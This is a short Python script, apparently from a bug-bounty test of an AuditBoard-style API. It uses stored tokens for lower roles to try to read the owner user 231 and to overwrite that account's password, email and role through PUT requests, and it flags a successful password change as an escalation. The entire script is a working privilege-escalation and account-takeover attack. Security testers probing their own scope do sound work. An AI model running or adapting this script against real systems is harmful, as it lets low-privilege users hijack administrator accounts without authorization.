import json,subprocess,os
H=os.environ['H']; BB=os.environ['BB']
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+tok,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== can a LOWER role escalate UP to Owner (231)? ===")
print(f"{'attacker role':18} {'GET 231':>8} {'PUT pw':>7} {'PUT email':>10} {'PUT role_id':>12}")
for role,f in [('Reviewer','/tmp/tok_Reviewer'),('Tester','/tmp/tok_Tester'),('ExternalAuditor','/tmp/tok_ExternalAuditor')]:
    try: tok=open(f).read().strip()
    except: print(f"  {role:18} no token"); continue
    g,_=req('GET','/api/v1/users/231',tok=tok)
    p,pb=req('PUT','/api/v1/users/231',{"user":{"password":"Zx9!up47"}},tok=tok)
    e,eb=req('PUT','/api/v1/users/231',{"user":{"email":"zx-up@bugcrowdninja.com"}},tok=tok)
    r,rb=req('PUT','/api/v1/users/231',{"user":{"role_id":2}},tok=tok)
    print(f"{role:18} {g:>8} {p:>7} {e:>10} {r:>12}")
    if p=='200': print("   *** ESCALATED via password ***")
